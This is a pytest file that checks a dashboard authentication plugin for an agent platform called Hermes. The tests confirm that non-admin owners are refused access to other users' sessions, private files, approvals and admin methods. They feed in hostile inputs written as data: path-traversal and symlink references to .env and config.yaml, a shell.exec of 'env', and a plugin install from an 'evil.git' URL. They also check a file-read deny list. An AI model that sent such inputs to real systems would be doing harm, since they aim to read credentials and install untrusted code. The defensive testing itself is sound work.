                    "@folder:../.dashboard-auth-edgecity", "@file:.dashboard-auth-edgecity/sessions.sqlite3",
                    "@file:.env", "@folder:plugins"):
            ctx = preprocess_context_references(f"look {ref}", cwd=cwd, allowed_root=cwd, context_length=200000)
            message = ctx.message or ""
            assert "example-not-a-key" not in message and "sessions.sqlite3" not in message.replace(ref, ""), (cwd, ref)
            assert "print(" not in message, (cwd, ref)
    assert hermes.guard.counts().get("denied_context_reference", 0) >= 5
    ok = preprocess_context_references("look @file:AGENTS.md", cwd=str(hermes.home), allowed_root=str(hermes.home),
                                       context_length=200000)
    assert "village rules" in (ok.message or "")


def test_hermes_s_new_2_the_key_store_and_plugin_code_are_on_the_agent_read_deny_list(hermes):
    from agent.file_safety import get_read_block_error

    store = hermes.home / ".dashboard-auth-edgecity" / "sessions.sqlite3"
    assert store.exists()
    assert get_read_block_error(str(store)) is not None
    assert get_read_block_error(str(store.parent)) is not None
    assert get_read_block_error(str(Path(hermes.plugin.__file__))) is not None
    assert get_read_block_error(str(hermes.home / ".env")) is not None  # Hermes's own, unchanged
    assert get_read_block_error(str(hermes.home / "resident-chat" / "notes.md")) is None
    names = [entry[0] for entry in hermes.file_safety._READ_DENIED_DIRS]
    assert names.count(".dashboard-auth-edgecity") == 1
    hermes.plugin.register(Ctx())
    assert [entry[0] for entry in hermes.file_safety._READ_DENIED_DIRS] == names


@pytest.mark.parametrize("break_it", ["delete", "reshape", "no_reader"])
def test_hermes_without_the_agent_read_deny_list_the_plugin_refuses_to_load(load_plugin, web_server, tmp_path,
                                                                             monkeypatch, break_it):
    from agent import file_safety
    from hermes_cli.dashboard_auth import registry

    plugin = load_plugin()
    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    monkeypatch.setenv("TENANT_ID", TENANT)
    monkeypatch.setenv("CONTROL_PLANE_URL", "http://127.0.0.1:9")
    if break_it == "delete":
        monkeypatch.delattr(file_safety, "_READ_DENIED_DIRS", raising=False)
    elif break_it == "reshape":
        monkeypatch.setattr(file_safety, "_READ_DENIED_DIRS", ["mcp-tokens", "vault"])
    else:
        monkeypatch.delattr(file_safety, "get_read_block_error", raising=False)
    registry.clear_providers()
    with pytest.raises(plugin.ResidentGuardNotInstalled):
        plugin.register(Ctx())
    assert registry.get_provider("edgecity") is None


def test_hermes_n3_an_admins_display_ticket_is_an_admins(hermes, monkeypatch):
    from tools.bot_desktop import runtime

    monkeypatch.setattr(runtime, "rfb_socket_path", lambda *a, **k: hermes.home / "probe-rfb.sock")
    admin, owner = as_role(hermes, "admin"), as_role(hermes, "owner")
    with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as sock:
        ready(sock)
        frame = rpc_call(sock, "display.observe", {}, rid=3)
        assert "result" in frame, frame
        info = hermes.ws_tickets.consume_ticket(frame["result"]["ticket"])
    assert info["edgecity_role"] == "admin" and info["provider"] == "bot-desktop"
    assert hermes.guard.counts().get("denied_display_ticket", 0) == 0
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        assert code_of(rpc_call(sock, "display.observe", {}, rid=3)) == 4031


@pytest.mark.parametrize("edgecity_configured", [True, False])
def test_hermes_n_b_the_guard_is_on_whichever_login_provider_is_configured(hermes, monkeypatch, edgecity_configured):
    """With Hermes's bundled username/password provider configured beside it (or instead of the
    edgecity provider, which then fails to construct), the plugin still installs the guard, and a
    basic-auth session is a resident."""
    from plugins.dashboard_auth import basic

    monkeypatch.setenv("HERMES_DASHBOARD_BASIC_AUTH_USERNAME", "probe-user")
    monkeypatch.setenv("HERMES_DASHBOARD_BASIC_AUTH_PASSWORD", "placeholder-not-a-secret")
    if not edgecity_configured:
        monkeypatch.delenv("TENANT_ID", raising=False)
    hermes.registry.clear_providers()
    basic.register(Ctx())
    hermes.plugin.register(Ctx())
    assert (hermes.registry.get_provider("edgecity") is not None) is edgecity_configured
    g = hermes.guard
    assert all(g.installed()[k] for k in ("http", "tickets", "ws", "gateway", "agent_reads", "references"))
    assert getattr(hermes.middleware.gated_auth_middleware, "_edgecity_resident_guard", False)
    session = hermes.registry.get_provider("basic").complete_password_login(
        username="probe-user", password="placeholder-not-a-secret")
    client = hermes.client()
    client.cookies.set("hermes_session_at", session.access_token)
    assert admin_only(client.put("/api/config", json={"config": {"plugins": {"disabled": ["av-approval"]}}}))
    assert client.get("/api/sessions").status_code == 200
    assert ws_refused(client, f"/api/console?ticket={ticket(client)}") == 4401
    with client.websocket_connect(f"/api/ws?ticket={ticket(client)}") as sock:
        ready(sock)
        assert code_of(rpc_call(sock, "plugins.manage", {"action": "list"})) == 4031


def test_hermes_slash_confirm_opt_outs_are_not_a_residents(quiet_turns):
    """verify@b2's addition: `approvals.mcp_reload_confirm` / `destructive_slash_confirm` are
    persisted by `reload.mcp {always}` (`methods_tools.py:320-327`) and by the slash commands,
    none of which a resident may call. `prompt.submit` text is a prompt, never a slash command
    (`methods_prompt.py:564-700`). The messaging gateway's own persistence
    (`gateway/run_busy.py:1319-1325`, `gateway/slash_commands.py:1080-1084`) is Telegram's, not
    the dashboard's."""
    hermes = quiet_turns
    owner = as_role(hermes, "owner")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        sid = create(sock)
        for i, (method, params) in enumerate((
                ("reload.mcp", {"session_id": sid, "confirm": True, "always": True}),
                ("slash.exec", {"session_id": sid, "command": "/reload-mcp always"}),
                ("slash.exec", {"session_id": sid, "command": "/clear"}),
                ("command.dispatch", {"session_id": sid, "name": "reload-mcp", "arg": "always"}),
                ("config.set", {"key": "approvals.mcp_reload_confirm", "value": "false"}))):
            assert code_of(rpc_call(sock, method, params, rid=10 + i)) == 4031, method
        for i, text in enumerate(("/reload-mcp always", "/clear", "/new")):
            assert code_of(rpc_call(sock, "prompt.submit", {"session_id": sid, "text": text}, rid=20 + i)) is None
    approvals = (read_yaml(hermes.home / "config.yaml") or {}).get("approvals") or {}
    assert "mcp_reload_confirm" not in approvals and "destructive_slash_confirm" not in approvals


# ---- SEC1-refute2 recheck d145378e (fix round 3): S-r3-1, S-r3-2, N-r3-3, N-r3-4 ----------------


def seed_list_rows(hermes):
    """`seed_rows`, plus what the recheck's P5 put in: an admin chat's first message and system
    prompt, the owner's own messages, rows the gateway's `session.list` shows (it hides `tool`
    sources) and rows with no `user_id` or no `source`."""
    from hermes_state import SessionDB

    seed_rows(hermes)
    db = SessionDB(db_path=hermes.home / "state.db")
    try:
        db.append_message("admin-chat", "user", content="probe admin first message placeholder-not-a-secret")
        db.update_system_prompt("admin-chat", "probe admin system prompt")
        db.append_message("own-chat", "user", content="probe own first message")
        db.append_message("tg-chat", "user", content="probe telegram first message")
        for sid, source, user in (("own-web", "tui", "edgecity:owner-id"), ("admin-web", "tui", "edgecity:admin-id"),
                                  ("no-user", "tool", None), ("no-source", "", "edgecity:admin-id")):
            db.create_session(session_id=sid, source=source, user_id=user)
        db.append_message("admin-web", "user", content="probe admin web message")
    finally:
        db.close()


OWNER_ROWS = {"own-chat", "tg-chat", "own-web"}


def test_hermes_s_r3_1_an_owners_session_list_carries_only_its_own_rows(hermes):
    """The recheck's P5 on the real app: no landing admin's preview or system prompt in any list an
    owner keeps; its own and its Telegram rows are there, paged and counted as its own; the admin
    still sees every row."""
    seed_list_rows(hermes)
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    everything = owner.get("/api/sessions", params={"limit": 100})
    assert everything.status_code == 200, everything.text
    body = everything.json()
    assert {r["id"] for r in body["sessions"]} == OWNER_ROWS and body["total"] == 3
    for query in ({}, {"order": "recent"}, {"full": "0"}, {"full": "false"}, {"min_messages": 1},
                  {"exclude_sources": "cron"}, {"archived": "include"}, {"profile": "default"}):
        resp = owner.get("/api/sessions", params=query)
        assert resp.status_code == 200, (query, resp.text)
        assert {r["id"] for r in resp.json()["sessions"]} <= OWNER_ROWS, query
        assert "probe admin" not in resp.text and "admin-id" not in resp.text, query
    paged = [owner.get("/api/sessions", params={"limit": 1, "offset": i}).json() for i in range(4)]
    assert [len(p["sessions"]) for p in paged] == [1, 1, 1, 0] and {p["total"] for p in paged} == {3}
    assert {p["sessions"][0]["id"] for p in paged[:3]} == OWNER_ROWS
    for query in ({"full": "1"}, {"full": "true"}, {"full": "0", "limit": 5, "offset": 0}):
        resp = owner.get("/api/sessions?" + urllib.parse.urlencode(query) + ("&full=1" if "limit" in query else ""))
        assert admin_only(resp), query
    for target in ("/api/sessions/stats", "/api/sessions/empty/count"):
        assert admin_only(owner.get(target)), target
    assert owner.get("/api/sessions", params={"archived": "nope"}).status_code == 400  # Hermes's own answer
    # The admin: every row, the preview and, with full=1, the system prompt; the counts.
    rows = {r["id"]: r for r in admin.get("/api/sessions", params={"limit": 100}).json()["sessions"]}
    assert {"admin-chat", "pty-chat", "cron-chat", "no-user", "no-source"} | OWNER_ROWS <= set(rows)
    assert "probe admin first message" in rows["admin-chat"]["preview"]
    full = {r["id"]: r for r in admin.get("/api/sessions", params={"full": 1, "limit": 100}).json()["sessions"]}
    assert full["admin-chat"].get("system_prompt") == "probe admin system prompt"
    assert admin.get("/api/sessions/stats").json()["total"] >= 9
    assert hermes.guard.counts()["resident_list_filtered"] >= 12


def fresh_gateway_store(hermes, monkeypatch):
    """The gateway opens its shared store once per process (`server._get_db`): point it at this
    test's HERMES_HOME, as a box's gateway is at its own."""
    monkeypatch.setattr(hermes.tui_server, "_db", None)


def test_hermes_s_r3_1_an_owners_gateway_lists_carry_only_its_own_rows(hermes, monkeypatch):
    from hermes_state import SessionDB

    fresh_gateway_store(hermes, monkeypatch)
    seed_list_rows(hermes)
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        listed = rpc_call(sock, "session.list", {"limit": 50}, rid=5)
        ids = [s["id"] for s in listed["result"]["sessions"]]
        assert set(ids) <= OWNER_ROWS and {"own-web", "tg-chat"} <= set(ids), ids
        assert "probe admin" not in str(listed)
        hidden = rpc_call(sock, "session.list", {"limit": 50, "include_hidden": True}, rid=6)
        assert set(s["id"] for s in hidden["result"]["sessions"]) <= OWNER_ROWS
        titled = rpc_call(sock, "session.list", {"title": "admin"}, rid=7)
        assert titled["result"]["sessions"] == [] or "error" in titled
        # The newest human-facing chat is the admin's: the owner is told there is none.
        assert rpc_call(sock, "session.most_recent", {}, rid=8)["result"]["session_id"] is None
    with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as asock:
        ready(asock)
        ids = [s["id"] for s in rpc_call(asock, "session.list", {"limit": 50}, rid=5)["result"]["sessions"]]
        assert {"admin-web", "own-web", "tg-chat"} <= set(ids)
        assert rpc_call(asock, "session.most_recent", {}, rid=6)["result"]["session_id"] == "admin-web"
    db = SessionDB(db_path=hermes.home / "state.db")
    try:
        db.append_message("own-web", "user", content="probe own web message, now the newest")
    finally:
        db.close()
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        assert rpc_call(sock, "session.most_recent", {}, rid=8)["result"]["session_id"] == "own-web"


def test_hermes_s_r3_2_an_owners_upload_reference_is_accepted_and_nothing_else(quiet_turns, monkeypatch):
    """The recheck's P8 on the real app: `file.attach`, then `prompt.submit` with the `ref_text`
    Hermes returned, is accepted, and so are a desktop paste and a file in the chat directory;
    `..` out of the uploads, a link in them to config.yaml, `.env` and `@folder:` are 4031."""
    import base64

    hermes = quiet_turns
    # The gateway stages uploads under the home it was imported with (`server.py:50`), on a box the
    # dashboard's own HERMES_HOME; here, this test's.
    monkeypatch.setattr(hermes.tui_server, "_hermes_home", hermes.home)
    plant_private_files(hermes.home)
    home = hermes.home
    owner = as_role(hermes, "owner")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        sid = create(sock)
        chat = hermes.tui_server._sessions[sid]["cwd"]
        data = "data:text/plain;base64," + base64.b64encode(b"harmless notes").decode()
        att = rpc_call(sock, "file.attach", {"session_id": sid, "data_url": data, "name": "notes.txt"}, rid=3)
        ref, path = att["result"]["ref_text"], att["result"]["path"]
        assert os.path.dirname(path) == os.path.realpath(home / "attachments") and ref == f"@file:{path}", att
        assert code_of(rpc_call(sock, "prompt.submit", {"session_id": sid, "text": "summarise " + ref}, rid=4)) is None
        (home / "composer-pastes").mkdir()
        (home / "composer-pastes" / "paste-1.txt").write_text("a long paste")
        Path(chat, "draft.md").write_text("a draft")
        for i, text in enumerate((f"@file:{home}/composer-pastes/paste-1.txt", "see @file:draft.md")):
            other = create(sock, rid=10 + i)
            assert code_of(rpc_call(sock, "prompt.submit", {"session_id": other, "text": text}, rid=20 + i)) is None, text
        os.symlink(home / "config.yaml", home / "attachments" / "cfg.txt")
        hostile = (f"@file:{home}/attachments/../config.yaml", f"@file:{home}/attachments/cfg.txt", f"@file:{home}/.env",
                   f"@folder:{home}/attachments", f"{ref} @file:config.yaml", "@file:../config.yaml",
                   f"{ref} @folder:.")
        for i, text in enumerate(hostile):
            frame = rpc_call(sock, "prompt.submit", {"session_id": sid, "text": text}, rid=40 + i)
            assert code_of(frame) == 4031, (text, frame)
    # What Hermes then does with the admitted references, as `prompt_turn.py:599` calls it from the
    # resident directory: the paste and the chat file inline; the upload, outside the chat's
    # directory, is Hermes's own "outside the allowed workspace" note (the agent reads it with
    # read_file); nothing private ever inlines.
    from agent.context_references import preprocess_context_references

    def expand(text):
        return preprocess_context_references(text, cwd=chat, allowed_root=chat, context_length=200000)

    assert "a long paste" in expand(f"@file:{home}/composer-pastes/paste-1.txt").message
    assert "a draft" in expand("@file:draft.md").message
    upload = expand("summarise " + ref)
    assert "harmless notes" not in upload.message and any("outside the allowed workspace" in w for w in upload.warnings)
    for text in hostile:
        assert "example-not-a-key" not in (expand(text).message or ""), text


def test_hermes_s_r3_2_an_upload_from_a_chat_running_in_home_is_refused(quiet_turns, monkeypatch):
    """A chat whose cwd is not the resident directory (a resumed Telegram chat runs where Hermes
    put it) admits no `@file:` at all: Hermes's own workspace check there is HERMES_HOME."""
    import base64

    hermes = quiet_turns
    monkeypatch.setattr(hermes.tui_server, "_hermes_home", hermes.home)
    fresh_gateway_store(hermes, monkeypatch)
    seed_rows(hermes)
    owner = as_role(hermes, "owner")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock:
        ready(sock)
        tsid = rpc_call(sock, "session.resume", {"session_id": "tg-chat"}, rid=3)["result"]["session_id"]
        hermes.tui_server._sessions[tsid]["cwd"] = str(hermes.home)
        data = "data:text/plain;base64," + base64.b64encode(b"harmless notes").decode()
        ref = rpc_call(sock, "file.attach", {"session_id": tsid, "data_url": data, "name": "n.txt"}, rid=4)["result"]["ref_text"]
        assert code_of(rpc_call(sock, "prompt.submit", {"session_id": tsid, "text": ref}, rid=5)) == 4031


@pytest.mark.parametrize("break_it", ["delete", "not_callable"])
def test_hermes_without_the_reference_backstop_the_plugin_refuses_to_load(load_plugin, web_server, tmp_path, monkeypatch,
                                                                          caplog, break_it):
    """N-r3-3: a Hermes that renamed `_ensure_reference_path_allowed` loses the only `@file:` line
    in the messaging gateway, so the plugin logs ERROR and refuses to load, as for the deny-list."""
    plugin = load_plugin()  # skips where Hermes is not importable
    from agent import context_references
    from hermes_cli.dashboard_auth import registry

    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    monkeypatch.setenv("TENANT_ID", TENANT)
    monkeypatch.setenv("CONTROL_PLANE_URL", "http://127.0.0.1:9")
    if break_it == "delete":
        monkeypatch.delattr(context_references, "_ensure_reference_path_allowed")
    else:
        monkeypatch.setattr(context_references, "_ensure_reference_path_allowed", "renamed")
    registry.clear_providers()
    caplog.set_level(logging.ERROR)
    with pytest.raises(plugin.ResidentGuardNotInstalled):
        plugin.register(Ctx())
    assert registry.get_provider("edgecity") is None
    assert any(r.levelno == logging.ERROR and "private-path check NOT installed" in r.getMessage() for r in caplog.records)


def test_hermes_n_r3_4_a_second_connection_of_the_same_resident_cannot_answer_the_firsts_request(hermes):
    """N-r3-4 (the recheck's P3, two connections): both carry the owner's login, so each may act on
    chats stamped with it, but only the connection attached to a chat answers its requests."""
    from tui_gateway import server_requests

    owner = as_role(hermes, "owner")
    with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock1:
        ready(sock1)
        answers_requests(sock1)
        sid1 = create(sock1)
        entry, frame = raise_approval(hermes, sock1, sid1, "req-conn1")
        with owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as sock2:
            ready(sock2)
            answers_requests(sock2)
            create(sock2)
            reply = frame_reply(sock2, {"jsonrpc": "2.0", "id": frame["id"], "result": {"choice": "once"}}, 11)
            assert code_of(reply) == 4031 and reply["error"]["data"]["reason"] == "not_own_session", reply
            answered = rpc_call(sock2, "request.answer", {"id": frame["id"], "result": {"choice": "once"}}, rid=12)
            assert code_of(answered) == 4031, answered
            assert entry.result is None and frame["id"] in server_requests._open
        assert frame_reply(sock1, {"jsonrpc": "2.0", "id": frame["id"], "result": {"choice": "once"}}, 13) is None
        for _ in range(50):
            if entry.result is not None:
                break
            import time

            time.sleep(0.02)
        assert entry.result == "once"



# ---- the hostile walk: every listed method, every frame shape, owner refused, admin served -------


def contract_params(method):
    from tui_gateway.contracts import registry

    contract = registry.METHODS.get(method)
    return set((contract.params.model_json_schema().get("properties") or {}) if contract else ())


def test_hermes_every_listed_method_refuses_hostile_parameters_to_an_owner_and_serves_an_admin(quiet_turns):
    """Each method on the resident list, sent by an owner with each hostile parameter its contract
    takes (another user's chat, a foreign request id, `always`, `@file:`, cwd `/`, a private path,
    another profile, a gateway-internal parameter): refused, 4031. The same frames from an admin
    are not refused by the guard. Then every method-less frame shape. Every listed method takes at
    least one hostile parameter or none at all (the handshake)."""
    hermes = quiet_turns
    seed_rows(hermes)
    g = hermes.guard
    admin, owner = as_role(hermes, "admin"), as_role(hermes, "owner")
    with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as asock, \
            owner.websocket_connect(f"/api/ws?ticket={ticket(owner)}") as osock:
        ready(asock)
        ready(osock)
        answers_requests(asock)
        answers_requests(osock, rid=91)
        asid, osid = create(asock), create(osock)
        _entry, aframe = raise_approval(hermes, asock, asid, "req-walk-admin")
        _own_entry, oframe = raise_approval(hermes, osock, osid, "req-walk-own")
        hostile = {
            "session_id": asid, "request_id": "req-walk-admin", "choice": "always", "text": "@file:config.yaml",
            "cwd": "/", "parent_session_id": "admin-chat", "path": str(hermes.home / ".env"), "profile": "worker",
            "_turn_author": {"id": "x"},
        }
        stored = {"session.resume": "admin-chat", "session.delete": "pty-chat"}
        base = {"session_id": osid}
        walked, rid = {}, 1000
        for method in sorted(g.RESIDENT_GATEWAY_METHODS):
            takes = contract_params(method)
            cases = []
            if method == "request.answer":
                cases = [{"id": aframe["id"], "result": {"choice": "once"}},
                         {"id": oframe["id"], "result": {"choice": "always"}},
                         {"id": "srq-unknown", "result": {"choice": "once"}}]
            else:
                for key, value in hostile.items():
                    if key not in takes:
                        continue
                    if key == "session_id" and method in stored:
                        value = stored[method]
                    params = {**(base if "session_id" in takes and method not in stored else {}), key: value}
                    if key == "request_id" or key == "choice":
                        params["session_id"] = osid
                    cases.append(params)
            walked[method] = len(cases)
            for params in cases:
                rid += 1
                frame = rpc_call(osock, method, params, rid=rid)
                assert code_of(frame) == 4031, (method, params, frame)
        assert {m for m, n in walked.items() if n == 0} == {"ping", "gateway.capabilities", "client.capabilities"}
        # The admin's socket: the same hostile frames are the admin's to send (the owner's chat is
        # the "other" chat here). Hermes may still answer an error of its own; never the guard's.
        hostile_admin = {**hostile, "session_id": osid}
        for method in sorted(g.RESIDENT_GATEWAY_METHODS):
            if method in ("session.close", "session.delete", "request.answer"):
                continue
            takes = contract_params(method)
            for key, value in hostile_admin.items():
                if key not in takes or key == "_turn_author":
                    continue
                rid += 1
                frame = rpc_call(asock, method, {"session_id": asid, key: value} if key != "session_id"
                                 else {key: value}, rid=rid)
                assert code_of(frame) != 4031, (method, key, frame)
        # Method-less frames.
        shapes = [{"jsonrpc": "2.0", "id": aframe["id"], "result": {"choice": "once"}},
                  {"jsonrpc": "2.0", "id": oframe["id"], "result": {"choice": "always"}},
                  {"jsonrpc": "2.0", "id": oframe["id"], "result": "always"},
                  {"jsonrpc": "2.0", "id": "srq-unknown", "result": {"choice": "once"}},
                  {"jsonrpc": "2.0", "id": "srq-unknown", "error": {"code": -32601, "message": "x"}},
                  {"jsonrpc": "2.0", "id": "srq-noresult"},
                  {"jsonrpc": "2.0", "result": {"choice": "once"}}]
        for i, shape in enumerate(shapes):
            reply = frame_reply(osock, shape, 5000 + i)
            if "id" in shape:
                assert code_of(reply) == 4031, (shape, reply)
        assert _entry.result is None and _own_entry.result is None
        for i, shape in enumerate(shapes[:2]):
            assert code_of(frame_reply(asock, shape, 6000 + i)) is None, shape
        assert _entry.result == "once"


# ==================================================================================================
# Round 4 (1.4.0): residents keep the Chat tab, with a credential bound to their own login
# ==================================================================================================

#: The child the Chat tab runs in these tests (Hermes's own tests swap `_resolve_chat_argv` for a
#: tiny command the same way): it prints its whole env once, then waits (or exits at once with
#: CHILD_EXIT=1). The env is the stand-in resolver's own, so it carries nothing of this machine's.
CHILD_SCRIPT = (
    "import json, os, sys, time\n"
    "sys.stdout.write('ENV-BEGIN' + json.dumps(dict(os.environ)) + 'ENV-END\\n'); sys.stdout.flush()\n"
    "time.sleep(0 if os.environ.get('CHILD_EXIT') == '1' else 60)\n"
)


@pytest.fixture
def chat_tab(quiet_turns, monkeypatch):
    """The real `/api/pty` handler, `PtyBridge` and registry, with `_resolve_chat_argv` replaced by
    a resolver that does what Hermes's does with its arguments (the attach URL with the
    process-wide credential unless profile-scoped, the newest descendant of a resume, the sidecar
    URL, the workspace) around CHILD_SCRIPT. The child dials 127.0.0.1:9119 as far as
    `_server_internal_ws_url` can tell (`HERMES_DASHBOARD_WS_HOST`, the bound port)."""
    import sys

    from hermes_cli import pty_bridge, web_server_chat
    from hermes_cli.web_server_sessions import _open_session_db_for_profile, _session_latest_descendant

    hermes = quiet_turns
    monkeypatch.setenv("HERMES_DASHBOARD_WS_HOST", "127.0.0.1")  # the host the child dials
    monkeypatch.setattr(hermes.app.state, "bound_port", 9119, raising=False)
    monkeypatch.setattr(hermes.tui_server, "_hermes_home", hermes.home, raising=False)
    state = SimpleNamespace(hermes=hermes, resolved=[], spawned=[], exit_at_once=False)

    def resolve(resume=None, sidecar_url=None, profile=None, active_session_file=None, workspace_cwd=None):
        state.resolved.append({"resume": resume, "sidecar_url": sidecar_url, "profile": profile,
                               "active_session_file": active_session_file, "workspace_cwd": workspace_cwd})
        env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "HERMES_HOME": str(hermes.home),
               "CHILD_EXIT": "1" if state.exit_at_once else "0", "HERMES_TUI_NO_CONFIRM": "1",
               "HERMES_HEAPDUMP_DIR": str(hermes.home / "heapdumps")}  # an operator's dump directory
        scoped = bool((profile or "").strip()) and (profile or "").strip().lower() != "current"
        if resume:
            db = _open_session_db_for_profile(None, read_only=True)
            try:
                latest, _path = _session_latest_descendant(resume, db)
            finally:
                db.close()
            env["HERMES_TUI_RESUME"] = latest or resume
        if sidecar_url:
            env["HERMES_TUI_SIDECAR_URL"] = sidecar_url
        if active_session_file:
            env["HERMES_TUI_ACTIVE_SESSION_FILE"] = active_session_file
        if workspace_cwd:
            env["HERMES_CWD"] = env["HERMES_TUI_CWD"] = workspace_cwd
        if not scoped:
            url = web_server_chat._build_gateway_ws_url()
            env["HERMES_TUI_GATEWAY_URL"] = url
            env["SOME_OTHER_URL"] = url  # a stray copy of the process-wide credential
        return [sys.executable, "-c", CHILD_SCRIPT], None, env

    real_spawn = pty_bridge.PtyBridge.spawn

    def counted_spawn(argv, **kwargs):
        state.spawned.append(kwargs.get("env"))
        return real_spawn(argv, **kwargs)

    monkeypatch.setattr(web_server_chat, "_resolve_chat_argv", resolve)
    monkeypatch.setattr(pty_bridge.PtyBridge, "spawn", staticmethod(counted_spawn))
    yield state
    for session in list(web_server_chat.PTY_REGISTRY._sessions.values()):
        with __import__("contextlib").suppress(Exception):
            session.bridge.close()
    web_server_chat.PTY_REGISTRY._sessions.clear()


def closed_with(client, url):
    """(code, reason) of a socket refused before accept, or None when it was accepted."""
    from starlette.websockets import WebSocketDisconnect

    try:
        with client.websocket_connect(url) as sock:
            sock.close()
            return None
    except WebSocketDisconnect as exc:
        return exc.code, exc.reason


def read_pty(sock, until, limit=200):
    """What the Chat tab's socket carries until `until` is in it: (bytes, text frames, close)."""
    data, texts = b"", []
    for _ in range(limit):
        msg = sock.receive()
        if msg["type"] == "websocket.close":
            return data, texts, msg
        if msg.get("bytes"):
            data += msg["bytes"]
        elif msg.get("text") is not None:
            texts.append(msg["text"])
        if until(data, texts):
            return data, texts, None
    raise AssertionError("the Chat tab never said it")


def child_env(sock):
    data, _texts, close = read_pty(sock, lambda d, t: b"ENV-END" in d)
    assert close is None, close
    import json

    return json.loads(data.decode("utf-8", "replace").split("ENV-BEGIN", 1)[1].split("ENV-END", 1)[0])


def query_of(url):
    return urllib.parse.parse_qs(urllib.parse.urlsplit(url).query)


def wait_for(predicate, seconds=10.0):
    import time

    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        if predicate():
            return True
        time.sleep(0.05)
    return predicate()


def receive_close(sock, seconds=10.0):
    """The close frame an open test socket gets, or None if none came in time."""
    import threading

    got = []

    def run():
        try:
            while True:
                msg = sock.receive()
                if msg["type"] == "websocket.close":
                    got.append(msg)
                    return
        except Exception as exc:  # noqa: BLE001 - the session ended: a disconnect
            got.append({"type": "websocket.close", "code": getattr(exc, "code", None)})

    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    thread.join(seconds)
    return got[0] if got else None


#: Every gateway method the 0.21.5 TUI sends (`ui-tui/src`, read for round 4): at startup, per
#: turn, from its slash commands, overlays and keybindings. `gateway.ping` is answered by
#: `tui_gateway/ws.py:353-356` before any dispatch.
TUI_METHODS = (
    "client.capabilities", "config.get", "wake.start", "commands.catalog", "session.most_recent", "setup.status",
    "session.close", "session.create", "session.title", "session.resume", "image.attach", "session.control.read",
    "reload.mcp", "subagent.list", "process.list", "session.active_list", "pet.info.meta", "pet.cells",
    "system.battery", "terminal.resize", "input.detect_drop", "prompt.submit", "session.interrupt", "session.steer",
    "delegation.status", "spawn_tree.save", "paste.collapse", "image.detach", "clipboard.paste", "complete.slash",
    "complete.path", "clarify.lock", "voice.record", "voice.toggle", "wake.resume", "config.set", "slash.exec",
    "command.dispatch", "session.status", "session.save", "session.undo", "prompt.background", "prompt.btw",
    "session.compress", "session.branch", "session.usage", "process.stop", "reload.env", "browser.manage",
    "rollback.list", "rollback.diff", "rollback.restore", "delegation.pause", "spawn_tree.list", "spawn_tree.load",
    "skills.reload", "skills.manage", "tools.configure", "wake.stop", "wake.status", "billing.state",
    "billing.step_up", "billing.charge_status", "billing.auto_reload", "billing.charge", "subscription.preview",
    "subscription.state", "subscription.resume", "subscription.change", "subscription.upgrade", "model.options",
    "model.save_key", "model.disconnect", "session.list", "session.delete", "session.activate", "subagent.steer",
    "subagent.tail", "subagent.interrupt", "learning.frames", "learning.delete", "learning.detail", "learning.edit",
    "plugins.manage", "pet.gallery", "pet.select", "connection.respond", "connectors.connect", "shell.exec",
)
#: What each escape a resident could type in the TUI sends (`!cmd` and `{!cmd}`: shell.exec;
#: `/plugins`, `/skills`, unknown commands: slash.exec then command.dispatch; `/model`: config.set;
#: `/reload`: reload.env; `/reload-mcp`: reload.mcp; `/browser`: browser.manage).
TUI_ESCAPES = (
    ("shell.exec", {"command": "env"}),
    ("slash.exec", {"command": "/plugins install https://example.invalid/evil.git"}),
    ("command.dispatch", {"name": "config", "arg": "set x y"}),
    ("cli.exec", {"argv": ["config", "set", "x", "y"]}),
    ("config.set", {"key": "model", "value": "x"}),
    ("config.get", {"key": "full"}),
    ("plugins.manage", {"action": "install", "identifier": "https://example.invalid/evil.git"}),
    ("reload.env", {}), ("reload.mcp", {"confirm": True}), ("browser.manage", {"action": "open"}),
    ("model.save_key", {"provider": "x", "key": "y"}),
)


def test_hermes_r4_an_owner_chats_in_the_chat_tab_as_itself(chat_tab):
    """The refuter's acceptance: an owner opens the Chat tab, its child gets a credential of its
    own (never the process-wide one) on the attach URL, and on /api/ws that child is the owner:
    the method table applies, its chats carry the owner's login, another login's chat is refused."""
    hermes = chat_tab.hermes
    g = hermes.guard
    owner, admin, child = as_role(hermes, "owner"), as_role(hermes, "admin"), hermes.client()
    chat = os.path.realpath(hermes.home / "resident-chat")
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-1") as pty:
        env = child_env(pty)
        process = hermes.ws_tickets.internal_ws_credential()
        gateway = urllib.parse.urlsplit(env["HERMES_TUI_GATEWAY_URL"])
        cred = query_of(env["HERMES_TUI_GATEWAY_URL"])["internal"][0]
        assert (gateway.scheme, gateway.netloc, gateway.path) == ("ws", "127.0.0.1:9119", "/api/ws")
        assert cred != process and len(cred) >= 43
        assert query_of(env["HERMES_TUI_SIDECAR_URL"]) == {"internal": [cred], "channel": ["chat-own-1"]}
        assert urllib.parse.urlsplit(env["HERMES_TUI_SIDECAR_URL"]).path == "/api/pub"
        assert not any(process in value for value in env.values()), "the process-wide credential reached the child"
        assert "SOME_OTHER_URL" not in env and "HERMES_TUI_NO_CONFIRM" not in env
        assert env["HERMES_CWD"] == env["HERMES_TUI_CWD"] == chat
        assert env["HOME"] == env["HERMES_HOME"] and os.path.dirname(env["HOME"]) == os.path.join(
            os.path.realpath(hermes.home), "resident-tui")
        assert oct(os.stat(env["HOME"]).st_mode & 0o777) == "0o700"
